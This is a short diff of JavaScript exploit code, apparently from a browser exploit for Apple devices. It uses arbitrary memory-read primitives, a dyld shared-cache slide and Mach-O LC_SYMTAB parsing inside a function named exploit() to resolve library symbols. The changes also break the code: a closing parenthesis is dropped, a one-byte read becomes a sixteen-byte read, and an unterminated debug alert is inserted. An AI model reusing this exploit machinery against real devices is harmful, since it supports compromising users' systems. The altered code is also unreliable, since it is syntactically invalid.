@@ -93,7 +93,7 @@ function fsyms(mem, base, segs, want, syms)
         var ncmds = memory.u32(Add(base, 0x10));
         for(var i = 0, off = 0x20; i < ncmds; ++i)
         {
-            var cmd = memory.u32(Add(base, off));
+            var cmd = memory.u32(Add(base, off)
             if(cmd == 0x2) // LC_SYMTAB
             {
                 var b = memory.read(Add(base, off + 0x8), 0x10);
@@ -714,11 +714,12 @@ function exploit(){
             var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                return memory.read(Add(straddr, i), 1)[0];
+                return memory.read(Add(straddr, i), 0x10)[0];
             };
             var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
+               alert("here Mmm
                 var ncmds = memory.u32(Add(base, 0x10));
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
                 {
